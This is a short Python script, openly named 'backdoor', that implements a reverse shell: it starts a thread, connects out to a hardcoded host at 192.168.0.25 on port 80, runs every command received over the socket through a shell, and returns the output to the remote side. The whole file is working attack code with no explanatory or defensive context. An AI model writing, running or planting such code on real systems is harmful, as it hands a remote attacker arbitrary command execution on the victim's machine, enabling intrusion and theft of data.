import threading
import socket
import subprocess
class backdoor(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.ip = '192.168.0.25'
		self.port = 80
		
	def run(self):
		self.socket.connect((self.ip, self.port))
		while True:
			data = self.socket.recv(1024)
			if data != '':
				proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdout_value = proc.stdout.read() + proc.stderr.read()
				self.socket.send(stdout_value)
			else:
				break
		self.socket.close()
		
		
newThread = backdoor()
newThread.start()
